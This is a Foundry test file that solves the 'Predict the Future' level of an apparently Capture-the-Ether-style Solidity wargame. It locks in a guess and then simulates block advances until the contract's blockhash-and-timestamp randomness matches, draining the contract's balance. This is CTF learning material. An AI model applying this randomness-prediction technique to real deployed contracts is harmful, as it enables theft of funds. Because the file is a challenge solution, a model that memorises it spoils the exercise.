// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/06_PredictTheFuture/PredictTheFuture.sol";

// forge test --match-contract PredictTheFutureTest -vvvv
contract PredictTheFutureTest is BaseTest {
    PredictTheFuture instance;

    function setUp() public override {
        super.setUp();
        instance = new PredictTheFuture{value: 0.01 ether}();

        vm.roll(143242);
    }

    function testExploitLevel() public {
        instance.setGuess{value: 0.01 ether}(0);

        // мы можем просто ждать, что ответ совпадет
        // число от 0 до 9
        // симулируем майнинг

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 15);

        uint256 answer;

        for (uint256 i = 0; i < 100; i++) {
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 15);

            answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 10;

            if(answer == 0) {
                break;
            }
        }
        
        instance.solution();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
